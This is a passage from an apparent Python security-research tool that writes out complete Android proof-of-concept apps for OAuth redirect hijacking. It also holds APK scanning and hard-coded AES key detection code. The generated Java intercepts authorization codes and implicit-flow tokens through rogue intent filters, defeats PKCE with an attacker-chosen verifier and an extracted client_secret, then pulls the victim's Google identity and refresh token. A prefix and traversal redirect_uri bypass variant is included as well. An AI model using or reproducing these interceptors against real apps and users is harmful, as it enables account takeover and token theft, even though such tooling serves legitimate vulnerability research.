        if (intent == null || intent.getData() == null) return;

        Uri data = intent.getData();
        String code = data.getQueryParameter("code");
        String error = data.getQueryParameter("error");
        String state = data.getQueryParameter("state");

        log("\\n=== REDIRECT INTERCEPTED ===");
        log("URI: " + data.toString());

        if (error != null) {{
            log("[!] Error: " + error);
            log("[!] Desc:  " + data.getQueryParameter("error_description"));
            return;
        }}

        if (code != null) {{
            log("[+] AUTHORIZATION CODE CAPTURED: " + code);
            log("[+] State: " + state);

            if (currentCodeVerifier != null && currentTokenEndpoint != null) {{
                log("\\n[*] Exchanging code with attacker's code_verifier...");
                log("[*] This defeats PKCE because we control the verifier.\\n");
                exchangeCodeForToken(code);
            }} else {{
                log("\\n[!] Passive interception - no code_verifier available");
                log("[!] Use the active flow buttons above to defeat PKCE");
            }}

            // Copy to clipboard
            try {{
                ClipboardManager clip = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
                if (clip != null) {{
                    clip.setPrimaryClip(ClipData.newPlainText("oauth-code", code));
                }}
            }} catch (Exception e) {{}}
        }}

        // Check fragment for implicit flow tokens
        String fragment = data.getFragment();
        if (fragment != null && fragment.contains("access_token")) {{
            log("\\n[+] IMPLICIT FLOW TOKEN IN FRAGMENT:");
            log(fragment);
        }}
    }}

    /**
     * Exchange authorization code for tokens.
     * Uses attacker's code_verifier - PKCE is satisfied.
     */
    private void exchangeCodeForToken(String code) {{
        new Thread(() -> {{
            try {{
                URL url = new URL(currentTokenEndpoint);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");

                String body = "grant_type=authorization_code"
                    + "&code=" + URLEncoder.encode(code, "UTF-8")
                    + "&client_id=" + URLEncoder.encode(currentClientId, "UTF-8")
                    + "&redirect_uri=" + URLEncoder.encode(currentRedirectUri, "UTF-8")
                    + "&code_verifier=" + URLEncoder.encode(currentCodeVerifier, "UTF-8");

                // Confidential (Web application) client: Google's token endpoint
                // rejects the exchange without the client_secret shipped in the APK.
                if (currentClientSecret != null && !currentClientSecret.isEmpty()) {{
                    body += "&client_secret=" + URLEncoder.encode(currentClientSecret, "UTF-8");
                    log("[*] Confidential client: attaching client_secret to /token exchange");
                }}

                conn.getOutputStream().write(body.getBytes(StandardCharsets.UTF_8));

                int status = conn.getResponseCode();
                InputStream is = (status >= 400) ? conn.getErrorStream() : conn.getInputStream();
                BufferedReader br = new BufferedReader(new InputStreamReader(is));
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = br.readLine()) != null) sb.append(line).append("\\n");

                String response = sb.toString();

                // Parse access_token from JSON response
                String accessToken = extractJsonValue(response, "access_token");
                String refreshToken = extractJsonValue(response, "refresh_token");

                runOnUiThread(() -> {{
                    log("[*] Token endpoint response (HTTP " + status + "):\\n");
                    log(response);

                    if (accessToken != null) {{
                        log("\\n[+] === TOKEN EXCHANGE SUCCESSFUL ===");
                        log("[+] access_token: " + accessToken.substring(0, Math.min(40, accessToken.length())) + "...");
                        if (refreshToken != null) {{
                            log("[+] refresh_token also captured -- attacker has");
                            log("[+] persistent access even after access_token expires.");
                        }}
                    }} else if (response.contains("error")) {{
                        log("\\n[-] Token exchange failed.");
                        log("[-] " + extractJsonValue(response, "error"));
                        log("[-] " + extractJsonValue(response, "error_description"));
                    }}
                }});

                // If we got an access_token, fetch victim identity
                if (accessToken != null) {{
                    fetchVictimIdentity(accessToken);
                }}
            }} catch (Exception e) {{
                runOnUiThread(() -> log("[!] Exchange error: " + e.getMessage()));
            }}
        }}).start();
    }}

    // ============================================================
    // Impact demonstration - exfiltrate victim identity
    // ============================================================

    /**
     * Fetch victim's Google profile using the stolen access_token.
     * Proves attacker can identify and impersonate the victim.
     */
    private void fetchVictimIdentity(String accessToken) {{
        new Thread(() -> {{
            // 1. Fetch userinfo (email, name, picture)
            fetchEndpoint("https://www.googleapis.com/oauth2/v3/userinfo",
                accessToken, "VICTIM IDENTITY");

            // Small delay so output doesn't interleave
            try {{ Thread.sleep(1500); }} catch (Exception e) {{}}

            // 2. Fetch token metadata to show full scope of compromise
            fetchEndpoint("https://www.googleapis.com/oauth2/v3/tokeninfo?access_token="
                + accessToken, null, "TOKEN METADATA");
        }}).start();
    }}

    private void fetchEndpoint(String endpoint, String bearerToken, String label) {{
        try {{
            URL url = new URL(endpoint);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            if (bearerToken != null) {{
                conn.setRequestProperty("Authorization", "Bearer " + bearerToken);
            }}
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(10000);

            int status = conn.getResponseCode();
            InputStream is = (status >= 400) ? conn.getErrorStream() : conn.getInputStream();
            BufferedReader br = new BufferedReader(new InputStreamReader(is));
            StringBuilder sb2 = new StringBuilder();
            String line2;
            while ((line2 = br.readLine()) != null) sb2.append(line2).append("\\n");

            String response = sb2.toString();

            runOnUiThread(() -> {{
                log("\\n--- " + label + " (HTTP " + status + ") ---");
                log(response);

                if ("VICTIM IDENTITY".equals(label) && status == 200) {{
                    // Parse and display victim info
                    String name = extractJsonValue(response, "name");
                    String email = extractJsonValue(response, "email");
                    String picture = extractJsonValue(response, "picture");
                    String sub = extractJsonValue(response, "sub");

                    log("\\n========================================");
                    log("[+] VICTIM IDENTIFIED:");
                    if (name != null) log("[+]  Name:    " + name);
                    if (email != null) log("[+]  Email:   " + email);
                    if (picture != null) log("[+]  Picture: " + picture);
                    if (sub != null) log("[+]  Sub:     " + sub);
                    log("========================================");
                    log("");
                    log("[!] IMPACT SUMMARY:");
                    log("[!]  - Attacker knows victim's Google identity");
                    log("[!]  - Attacker has valid access_token (1hr)");
                    log("[!]  - Attacker has refresh_token (persistent)");
                    log("[!]  - Can access any Google API within granted scopes");
                    log("[!]  - Can impersonate victim to {package_name} sync service");

                    // Copy to clipboard
                    try {{
                        String clipText = "VICTIM: " + name + " | " + email + " | " + sub;
                        ClipboardManager clip = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
                        if (clip != null) clip.setPrimaryClip(ClipData.newPlainText("victim-id", clipText));
                    }} catch (Exception e) {{}}
                }}
            }});
        }} catch (Exception e) {{
            runOnUiThread(() -> log("[!] " + label + " error: " + e.getMessage()));
        }}
    }}

    /**
     * Simple JSON value extractor -- avoids needing org.json import.
     * Handles "key":"value" and "key":number patterns.
     */
    private static String extractJsonValue(String json, String key) {{
        if (json == null || key == null) return null;
        String pattern = "\\"" + key + "\\"";
        int idx = json.indexOf(pattern);
        if (idx < 0) return null;
        int colonIdx = json.indexOf(":", idx + pattern.length());
        if (colonIdx < 0) return null;
        int valStart = colonIdx + 1;
        while (valStart < json.length() && json.charAt(valStart) == ' ') valStart++;
        if (valStart >= json.length()) return null;
        if (json.charAt(valStart) == '"') {{
            int valEnd = json.indexOf('"', valStart + 1);
            if (valEnd < 0) return null;
            return json.substring(valStart + 1, valEnd);
        }} else if (json.charAt(valStart) == '{{') {{
            return null;
        }} else {{
            int valEnd = valStart;
            while (valEnd < json.length() && json.charAt(valEnd) != ',' && json.charAt(valEnd) != '}}') valEnd++;
            return json.substring(valStart, valEnd).trim();
        }}
    }}

    // ============================================================
    // PKCE utilities - attacker generates their own verifier/challenge
    // ============================================================

    private String generateCodeVerifier() {{
        SecureRandom sr = new SecureRandom();
        byte[] bytes = new byte[32];
        sr.nextBytes(bytes);
        return Base64.encodeToString(bytes,
            Base64.URL_SAFE | Base64.NO_PADDING | Base64.NO_WRAP);
    }}

    private String generateCodeChallenge(String verifier) {{
        try {{
            MessageDigest md = MessageDigest.getInstance("SHA-256");
            byte[] hash = md.digest(verifier.getBytes(StandardCharsets.US_ASCII));
            return Base64.encodeToString(hash,
                Base64.URL_SAFE | Base64.NO_PADDING | Base64.NO_WRAP);
        }} catch (Exception e) {{
            throw new RuntimeException(e);
        }}
    }}

    private String generateRandomString(int length) {{
        SecureRandom sr = new SecureRandom();
        byte[] bytes = new byte[length];
        sr.nextBytes(bytes);
        return Base64.encodeToString(bytes,
            Base64.URL_SAFE | Base64.NO_PADDING | Base64.NO_WRAP).substring(0, length);
    }}

    private void log(String msg) {{
        Log.d(TAG, msg);
        outputView.append(msg + "\\n");
    }}
}}'''

    # --- build.gradle (root) ---
    root_gradle = '''buildscript {
    repositories { google(); mavenCentral() }
    dependencies { classpath 'com.android.tools.build:gradle:8.1.0' }
}
allprojects { repositories { google(); mavenCentral() } }
'''

    # --- app/build.gradle ---
    app_gradle = '''plugins { id 'com.android.application' }
android {
    namespace 'com.poc.activeoauth'
    compileSdk 34
    defaultConfig {
        applicationId "com.poc.activeoauth"
        minSdk 24
        targetSdk 34
        versionCode 1
        versionName "1.0"
    }
    compileOptions {
        sourceCompatibility JavaVersion.VERSION_1_8
        targetCompatibility JavaVersion.VERSION_1_8
    }
}
dependencies {}
'''

    # --- settings.gradle ---
    settings = '''pluginManagement {
    repositories { google(); mavenCentral(); gradlePluginPortal() }
}
rootProject.name = "ActiveOAuthPOC"
include ':app'
'''

    # --- gradle files ---
    props = 'android.useAndroidX=true\norg.gradle.jvmargs=-Xmx2048m\n'
    wrapper = '''distributionBase=GRADLE_USER_HOME
distributionPath=wrapper/dists
distributionUrl=https\\://services.gradle.org/distributions/gradle-8.4-bin.zip
zipStoreBase=GRADLE_USER_HOME
zipStorePath=wrapper/dists
'''

    # Write all files
    files = {
        os.path.join(poc_dir, 'app', 'src', 'main', 'AndroidManifest.xml'): manifest,
        os.path.join(src_dir, 'ActiveOAuthActivity.java'): activity,
        os.path.join(poc_dir, 'build.gradle'): root_gradle,
        os.path.join(poc_dir, 'app', 'build.gradle'): app_gradle,
        os.path.join(poc_dir, 'settings.gradle'): settings,
        os.path.join(poc_dir, 'gradle.properties'): props,
        os.path.join(poc_dir, 'gradle', 'wrapper', 'gradle-wrapper.properties'): wrapper,
    }

    for path, content in files.items():
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, 'w', encoding='utf-8') as f:
            f.write(content)

    return poc_dir


def generate_passive_poc(package_name, scheme, output_dir,
                         redirect_host='', redirect_path=''):
    """
    Generate passive scheme-claim POC.
    Used when no provider Client ID is available.

    Returns None if the scheme is not a valid passive-hijack target
    (http/https are claimed App Links, not private-use schemes - claiming them
    does not intercept an OAuth redirect and floods the browser chooser).
    """
    # Guard: http/https are NOT private-use schemes. A passive scheme-claim POC
    # against them is meaningless - the OS treats them as web links (App Links),
    # and a bare https filter with no host just makes the POC a candidate for
    # every https URL. Refuse to generate a broken POC.
    if scheme.lower() in ('http', 'https') or not scheme:
        return None

    safe_name = re.sub(r'[^a-zA-Z0-9]', '_', scheme)
    poc_dir = os.path.join(output_dir, f'poc_passive_{safe_name}')
    src_dir = os.path.join(poc_dir, 'app', 'src', 'main', 'java', 'com', 'poc', 'oauthhijack')
    os.makedirs(src_dir, exist_ok=True)
    os.makedirs(os.path.join(poc_dir, 'gradle', 'wrapper'), exist_ok=True)

    # Build data attributes mirroring the target manifest's host/path.
    # Use pathPrefix (not path) so the POC wins BOTH the exact redirect path and
    # any sibling paths on the same host (e.g. /normal AND /magiclink), which is
    # how a real competing handler maximizes interception.
    if redirect_host:
        host_attr = f'\n                      android:host="{redirect_host}"'
        # pathPrefix on the parent segment catches sibling auth paths
        if redirect_path:
            prefix = redirect_path.rsplit('/', 1)[0] or '/'
            path_attr = f'\n                      android:pathPrefix="{prefix}"'
        else:
            path_attr = ''
        data_line = f'android:scheme="{scheme}"{host_attr}{path_attr}'
    elif '.' in scheme:
        # Reverse-domain custom scheme with no recovered host: claim scheme broadly
        data_line = f'android:scheme="{scheme}"'
    else:
        data_line = f'android:scheme="{scheme}"'

    manifest = f'''<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android">
    <application
        android:allowBackup="true"
        android:label="OAuth Hijack POC"
        android:theme="@android:style/Theme.Material.Light">
        <activity
            android:name=".TokenCatcherActivity"
            android:exported="true"
            android:launchMode="singleTask">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.VIEW" />
                <category android:name="android.intent.category.DEFAULT" />
                <category android:name="android.intent.category.BROWSABLE" />
                <data {data_line}/>
            </intent-filter>
        </activity>
    </application>
</manifest>'''

    activity = f'''package com.poc.oauthhijack;
import android.app.Activity;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.*;
import java.util.Set;
public class TokenCatcherActivity extends Activity {{
    private static final String TAG = "OAuth-Hijack-POC";
    private TextView outputView;
    @Override protected void onCreate(Bundle savedInstanceState) {{
        super.onCreate(savedInstanceState);
        ScrollView scroll = new ScrollView(this);
        outputView = new TextView(this);
        outputView.setPadding(32, 32, 32, 32);
        outputView.setTextSize(14f);
        outputView.setTextIsSelectable(true);
        scroll.addView(outputView);
        setContentView(scroll);
        handleIntent(getIntent());
    }}
    @Override protected void onNewIntent(Intent intent) {{
        super.onNewIntent(intent);
        handleIntent(intent);
    }}
    private void handleIntent(Intent intent) {{
        if (intent == null || intent.getData() == null) {{
            outputView.setText("PASSIVE OAuth Hijack POC\\nTarget: {package_name}\\nScheme: {scheme}\\n\\n"
                + "1. Leave this app installed\\n2. Open target app\\n"
                + "3. Sign in with social/SSO\\n4. Check if redirect lands here\\n");
            return;
        }}
        Uri data = intent.getData();
        StringBuilder sb = new StringBuilder();
        sb.append("[+] CALLBACK INTERCEPTED!\\n\\nTarget: {package_name}\\n");
        sb.append("URI: ").append(data.toString()).append("\\n\\n");

        // --- Query parameters ---
        Set<String> params = data.getQueryParameterNames();
        if (params != null && !params.isEmpty()) {{
            sb.append("--- QUERY PARAMS ---\\n");
            for (String key : params) {{
                String val = data.getQueryParameter(key);
                sb.append("  ").append(key).append(" = ").append(val).append("\\n");
                flagSensitive(sb, key, val);
            }}
        }}

        // --- Fragment params (token-in-redirect / implicit flows) ---
        // Critical: getQueryParameter() does NOT see the fragment. OAuth implicit
        // and magic-link flows deliver access_token in the #fragment, e.g.
        //   scheme://host/path#state=...&access_token=...&expires_in=...
        String fragment = data.getEncodedFragment();
        if (fragment != null && !fragment.isEmpty()) {{
            sb.append("\\n--- FRAGMENT PARAMS (token-in-redirect) ---\\n");
            for (String pair : fragment.split("&")) {{
                int eq = pair.indexOf('=');
                String key = eq >= 0 ? pair.substring(0, eq) : pair;
                String val = eq >= 0 ? Uri.decode(pair.substring(eq + 1)) : "";
                sb.append("  ").append(key).append(" = ").append(val).append("\\n");
                flagSensitive(sb, key, val);
            }}
        }}

        outputView.setText(sb.toString());
        Log.e(TAG, "CAPTURED: " + data.toString());
        try {{
            ClipboardManager clip = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
            if (clip != null) clip.setPrimaryClip(ClipData.newPlainText("oauth", data.toString()));
        }} catch (Exception e) {{}}
    }}

    /** Highlight credentials that prove impact (access_token defeats PKCE; code does not). */
    private void flagSensitive(StringBuilder sb, String key, String val) {{
        if (key == null) return;
        String k = key.toLowerCase();
        if (k.equals("access_token") || k.equals("id_token") || k.equals("refresh_token")) {{
            sb.append("  ^^^ BEARER CREDENTIAL - NOT PKCE-bound, directly replayable ^^^\\n");
        }} else if (k.equals("code")) {{
            sb.append("  ^^^ authorization code - only useful if PKCE absent/attacker-initiated ^^^\\n");
        }} else if (k.equals("state")) {{
            sb.append("  ^^^ state - required by some handlers (e.g. WaPo magic-link gate) ^^^\\n");
        }}
    }}
}}'''

    app_gradle = '''plugins { id 'com.android.application' }
android {
    namespace 'com.poc.oauthhijack'
    compileSdk 34
    defaultConfig {
        applicationId "com.poc.oauthhijack"
        minSdk 24
        targetSdk 34
        versionCode 1
        versionName "1.0"
    }
    compileOptions {
        sourceCompatibility JavaVersion.VERSION_1_8
        targetCompatibility JavaVersion.VERSION_1_8
    }
}
dependencies {}
'''

    files = {
        os.path.join(poc_dir, 'app', 'src', 'main', 'AndroidManifest.xml'): manifest,
        os.path.join(src_dir, 'TokenCatcherActivity.java'): activity,
        os.path.join(poc_dir, 'build.gradle'): 'buildscript {\n    repositories { google(); mavenCentral() }\n    dependencies { classpath \'com.android.tools.build:gradle:8.1.0\' }\n}\nallprojects { repositories { google(); mavenCentral() } }\n',
        os.path.join(poc_dir, 'app', 'build.gradle'): app_gradle,
        os.path.join(poc_dir, 'settings.gradle'): 'pluginManagement {\n    repositories { google(); mavenCentral(); gradlePluginPortal() }\n}\nrootProject.name = "OAuthHijackPOC"\ninclude \':app\'\n',
        os.path.join(poc_dir, 'gradle.properties'): 'android.useAndroidX=true\norg.gradle.jvmargs=-Xmx2048m\n',
        os.path.join(poc_dir, 'gradle', 'wrapper', 'gradle-wrapper.properties'): 'distributionBase=GRADLE_USER_HOME\ndistributionPath=wrapper/dists\ndistributionUrl=https\\://services.gradle.org/distributions/gradle-8.4-bin.zip\nzipStoreBase=GRADLE_USER_HOME\nzipStorePath=wrapper/dists\n',
    }

    for path, content in files.items():
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, 'w', encoding='utf-8') as f:
            f.write(content)

    return poc_dir


def generate_prefix_variation_poc(package_name, scheme, output_dir,
                                   redirect_host='', redirect_path=''):
    """
    Generate a POC that exploits prefix-based redirect_uri validation.

    Prefix-validation bypass: the authorization server registers
      com.example.app://callback/com.example.app
    and validates by prefix, so an attacker submits
      com.example.app://callback/com.attacker.poc
    which passes the prefix check. The rogue app registers an intent-filter
    with android:path="/callback/com.attacker.poc" - a more-specific match
    than the victim app's filter - so Android routes the redirect without
    a chooser dialog.

    Two POC variants are generated:
      path_suffix - appends /com.poc.prefixtest to the registered path
      path_dotdot - appends /../../com.poc.prefixtest (traversal variation)
    """
    safe_name = re.sub(r'[^a-zA-Z0-9]', '_', scheme)
    poc_dir = os.path.join(output_dir, f'poc_prefix_{safe_name}')
    src_dir = os.path.join(poc_dir, 'app', 'src', 'main', 'java', 'com', 'poc', 'prefixtest')
    os.makedirs(src_dir, exist_ok=True)
    os.makedirs(os.path.join(poc_dir, 'gradle', 'wrapper'), exist_ok=True)

    # Build attacker-controlled redirect path variants.
    # The intent-filter uses the more-specific path so Android routes here
    # without a disambiguation dialog when the victim app's filter is less specific.
    base_path = redirect_path.rstrip('/') if redirect_path else '/oauth2callback'
    attacker_suffix = '/com.poc.prefixtest'
    attacker_path_a = base_path + attacker_suffix           # suffix variant
    attacker_path_b = base_path + '/../../com.poc.prefixtest'  # traversal variant

    # The attacker redirect_uri sent to the AS (must pass prefix check)
    attacker_redirect_a = f'{scheme}://{redirect_host}{attacker_path_a}' if redirect_host else f'{scheme}:{attacker_path_a}'
    attacker_redirect_b = f'{scheme}://{redirect_host}{attacker_path_b}' if redirect_host else f'{scheme}:{attacker_path_b}'

    host_attr_a = f'\n                      android:host="{redirect_host}"' if redirect_host else ''
    host_attr_b = host_attr_a

    manifest = f'''<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android">
    <application
        android:allowBackup="true"
        android:label="Prefix Redirect POC"
        android:theme="@android:style/Theme.Material.Light">
        <activity
            android:name=".PrefixCatcherActivity"
            android:exported="true"
            android:launchMode="singleTask">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
            <!-- Variant A: suffix path - more specific than victim filter -->
            <intent-filter>
                <action android:name="android.intent.action.VIEW" />
                <category android:name="android.intent.category.DEFAULT" />
                <category android:name="android.intent.category.BROWSABLE" />
                <data android:scheme="{scheme}"{host_attr_a}
                      android:path="{attacker_path_a}" />
            </intent-filter>
            <!-- Variant B: traversal path -->
            <intent-filter>
                <action android:name="android.intent.action.VIEW" />
                <category android:name="android.intent.category.DEFAULT" />
                <category android:name="android.intent.category.BROWSABLE" />
                <data android:scheme="{scheme}"{host_attr_b}
                      android:path="{attacker_path_b}" />
            </intent-filter>
        </activity>
    </application>
</manifest>'''

    activity = f'''package com.poc.prefixtest;

import android.app.Activity;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.view.Gravity;
import android.widget.*;

/**
 * Prefix redirect_uri validation POC
 * Target: {package_name}
 *
 * HOW TO USE:
 *   1. Install this POC APK on the test device.
 *   2. Verify it also has the target app installed.
 *   3. Trigger an OAuth flow in the target app (or via adb/deeplink).
 *   4. If the AS validates redirect_uri by prefix, the redirect lands here
 *      instead of in the target app.
 *
 * REDIRECT URIS TO TEST (submit these to the AS):
 *   Variant A (suffix):    {attacker_redirect_a}
 *   Variant B (traversal): {attacker_redirect_b}
 *
 * If the AS accepts either, this activity captures the auth code.
 */
public class PrefixCatcherActivity extends Activity {{

    private static final String TAG = "PrefixPOC";
    private TextView outputView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {{
        super.onCreate(savedInstanceState);

        ScrollView scroll = new ScrollView(this);
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setPadding(32, 48, 32, 32);

        TextView title = new TextView(this);
        title.setText("Prefix redirect_uri POC\\nTarget: {package_name}");
        title.setTextSize(18f);
        title.setGravity(Gravity.CENTER);
        title.setPadding(0, 0, 0, 16);
        root.addView(title);

        TextView info = new TextView(this);
        info.setTextSize(12f);
        info.setPadding(0, 0, 0, 16);
        info.setText(
            "Registered path:   {redirect_path}\\n" +
            "Attacker path A:   {attacker_path_a}\\n" +
            "Attacker path B:   {attacker_path_b}\\n\\n" +
            "Submit Variant A or B as redirect_uri to the AS.\\n" +
            "If accepted, the code lands here instead of the target app."
        );
        root.addView(info);

        outputView = new TextView(this);
        outputView.setPadding(0, 16, 0, 0);
        outputView.setTextSize(13f);
        outputView.setTextIsSelectable(true);
        root.addView(outputView);

        scroll.addView(root);
        setContentView(scroll);

        handleIntent(getIntent());
    }}

    @Override
    protected void onNewIntent(Intent intent) {{
        super.onNewIntent(intent);
        handleIntent(intent);
    }}

    private void handleIntent(Intent intent) {{
        if (intent == null || intent.getData() == null) return;
        Uri data = intent.getData();
        String code = data.getQueryParameter("code");
        String error = data.getQueryParameter("error");

        log("=== REDIRECT INTERCEPTED ===");
        log("URI: " + data.toString());

        if (error != null) {{
            log("[!] Error: " + error + " - " + data.getQueryParameter("error_description"));
            log("[!] AS likely validates redirect_uri strictly - try the other variant");
            return;
        }}

        if (code != null) {{
            log("[+] AUTH CODE CAPTURED: " + code);
            log("[+] Prefix validation confirmed vulnerable");
            try {{
                ClipboardManager clip = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
                if (clip != null) clip.setPrimaryClip(ClipData.newPlainText("code", code));
                log("[+] Copied to clipboard");
            }} catch (Exception e) {{}}
        }} else {{
            log("[*] Redirect received but no code parameter");
            log("[*] Full URI: " + data.toString());
        }}
    }}

    private void log(String msg) {{
        Log.d(TAG, msg);
        if (outputView != null) outputView.append(msg + "\\n");
    }}
}}'''

    app_gradle = '''plugins { id 'com.android.application' }
android {
    namespace 'com.poc.prefixtest'
    compileSdk 34
    defaultConfig {
        applicationId "com.poc.prefixtest"
        minSdk 24
        targetSdk 34
        versionCode 1
        versionName "1.0"
    }
    compileOptions {
        sourceCompatibility JavaVersion.VERSION_1_8
        targetCompatibility JavaVersion.VERSION_1_8
    }
}
dependencies {}
'''

    files = {
        os.path.join(poc_dir, 'app', 'src', 'main', 'AndroidManifest.xml'): manifest,
        os.path.join(src_dir, 'PrefixCatcherActivity.java'): activity,
        os.path.join(poc_dir, 'build.gradle'): 'buildscript {\n    repositories { google(); mavenCentral() }\n    dependencies { classpath \'com.android.tools.build:gradle:8.1.0\' }\n}\nallprojects { repositories { google(); mavenCentral() } }\n',
        os.path.join(poc_dir, 'app', 'build.gradle'): app_gradle,
        os.path.join(poc_dir, 'settings.gradle'): "pluginManagement {\n    repositories { google(); mavenCentral(); gradlePluginPortal() }\n}\nrootProject.name = \"PrefixRedirectPOC\"\ninclude ':app'\n",
        os.path.join(poc_dir, 'gradle.properties'): 'android.useAndroidX=true\norg.gradle.jvmargs=-Xmx2048m\n',
        os.path.join(poc_dir, 'gradle', 'wrapper', 'gradle-wrapper.properties'): 'distributionBase=GRADLE_USER_HOME\ndistributionPath=wrapper/dists\ndistributionUrl=https\\://services.gradle.org/distributions/gradle-8.4-bin.zip\nzipStoreBase=GRADLE_USER_HOME\nzipStorePath=wrapper/dists\n',
    }

    for path, content in files.items():
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, 'w', encoding='utf-8') as f:
            f.write(content)

    return poc_dir


def scan_apk_for_providers(apk_path):
    """
    Scan APK for OAuth scheme hijack vulnerabilities.
    
    Strategy: try androguard (structural XML parse, zero FPs) first,
    fall back to binary string extraction ONLY if androguard is unavailable
    or fails to parse.
    
    CRITICAL: if androguard successfully parses the manifest and finds
    nothing, that is the final answer. Do NOT fall through to v1 string
    extraction -- that is where false positives come from (VPN/root-detection
    package lists, MSAL strings, third-party social SDK refs, etc).
    """
    # === PRIMARY: Androguard structural parse ===
    try:
        package, providers, generic_findings, app_schemes = \
            extract_oauth_providers_androguard(apk_path)
        # Androguard succeeded -- trust its result unconditionally.
        # If it found nothing, the APK is clean. No fallback.
        return package, providers, generic_findings, app_schemes
    except ImportError:
        pass  # androguard not installed -> fall back
    except Exception:
        pass  # androguard failed to parse this APK -> fall back

    # === SECONDARY: aapt for reliable package name ===
    aapt_package = None
    for aapt_cmd in ('aapt', 'aapt2'):
        try:
            import subprocess
            result = subprocess.run(
                [aapt_cmd, 'dump', 'badging', apk_path],
                capture_output=True, text=True, timeout=15
            )
            if result.returncode == 0:
                m = re.search(r"package:\s+name='([^']+)'", result.stdout)
                if m:
                    aapt_package = m.group(1)
                    break
        except (FileNotFoundError, subprocess.TimeoutExpired, Exception):
            continue

    # === FALLBACK: Binary string extraction (v1) ===
    # Only reached if androguard is not available or crashed.
    try:
        with zipfile.ZipFile(apk_path, 'r') as zf:
            if 'AndroidManifest.xml' in zf.namelist():
                manifest = zf.read('AndroidManifest.xml')
                providers, generic_findings, app_schemes = extract_oauth_providers(manifest)
                
                # --- Package name resolution ---
                # Priority: aapt > AXML parse > filename fallback
                if aapt_package:
                    package = aapt_package
                else:
                    # Parse the package attribute directly from the binary manifest
                    package = extract_package_from_axml(manifest) or 'unknown'

                    # Last resort: derive from APK filename for unique POC dirs
                    if package == 'unknown':
                        base = os.path.splitext(os.path.basename(apk_path))[0]
                        package = re.sub(r'[^a-zA-Z0-9.]', '.', base).strip('.')
                
                return package, providers, generic_findings, app_schemes
    except Exception as e:
        print(f"Error: {e}", file=sys.stderr)
    
    return 'unknown', [], [], set()

# ============================================================
# OAuth scheme-hijack adapter (maps engine output -> pSlip vulns)
# ============================================================
_OAUTH_TIER_TO_SEV = {
    'CONFIRMED': 'Critical', 'HIGH': 'High', 'MEDIUM': 'Medium', 'LOW': 'Low',
}
_OAUTH_GENERIC_SEV = {
    'CRITICAL': 'Critical', 'HIGH': 'High', 'MEDIUM': 'Medium', 'INFO': 'Info',
}
_OAUTH_TYPE_TO_ISSUE = {
    'OAUTH_SCHEME_HIJACK': 'OAuth Scheme Hijack (Passive)',
    'WEBVIEW_DEEPLINK_CHAIN': 'OAuth WebView Deeplink Chain',
    'CUSTOM_BROWSABLE_SCHEME': 'OAuth Custom Scheme (Review)',
}


def _silence_androguard_logs():
    """Androguard 4.x logs via loguru (per-APK INFO/WARNING). Across thousands
    of APKs that floods stderr and slows the run. Disable it once per process."""
    try:
        from loguru import logger as _lg
        _lg.disable("androguard")
    except Exception:
        pass
    try:
        import logging as _l
        _l.getLogger("androguard").setLevel(_l.CRITICAL)
    except Exception:
        pass


_silence_androguard_logs()


def find_aes_keys_androguard(apk_file, package_name):
    """Primary AES/DES/IV key detector: pure androguard DEX bytecode analysis.

    Finds call sites of javax.crypto.spec.SecretKeySpec / IvParameterSpec and
    backtraces the key/IV register intraprocedurally to a constant source.

    PROVENANCE RULE (kills the naive false positives): a byte[] key/IV can
    never be a bare const-string, so a value is only reported if it reached
    the constructor through String.getBytes() or a filled-new-array literal.
    This rejects the algorithm-name ("AES"), KDF-name ("PBKDF2WithHmacSHA1")
    and exception-string matches that a nearest-const-string heuristic emits.

    No decompiler, no Java, no subprocess: reads the DEX directly, so the
    large-APK jadx-timeout class of failure does not exist here. Returns a
    list of pSlip vulnerability dicts (identical shape to the jadx path).

    Limitation: the register model is intraprocedural and linear (not
    basic-block/SSA aware). It resolves the common const -> getBytes ->
    SecretKeySpec and literal-array patterns; keys assembled across branches
    or loaded from static fields are left to the deep (-aes-deep) jadx pass.
    """
    _silence_androguard_logs()
    out = []
    try:
        from androguard.core.apk import APK
    except Exception:
        return out
    try:
        from androguard.core.dex import DEX, Operand
    except Exception:
        try:
            from androguard.core.bytecodes.dvm import DalvikVMFormat as DEX
            from androguard.core.bytecodes.dvm import Operand
        except Exception:
            return out

    SKS = 'Ljavax/crypto/spec/SecretKeySpec;'
    IVS = 'Ljavax/crypto/spec/IvParameterSpec;'
    CIP = 'Ljavax/crypto/Cipher;'
    INTC = ('const/4', 'const/16', 'const', 'const/high16')

    def _analyze(em):
        reg = {}
        pending = None
        findings = []          # (kind, ('kb', bytes, via) | None, algo)
        transform = [None]
        try:
            instrs = em.get_instructions()
        except Exception:
            return findings, None
        for ins in instrs:
            nm = ins.get_name()
            try:
                ops = ins.get_operands()
                out_s = ins.get_output()
            except Exception:
                pending = None
                continue
            rgs = [o[1] for o in ops if o and o[0] == Operand.REGISTER]
            ref = None
            for o in ops:
                if o and o[0] != Operand.REGISTER:
                    ref = o[-1]
            if nm.startswith('const-string'):
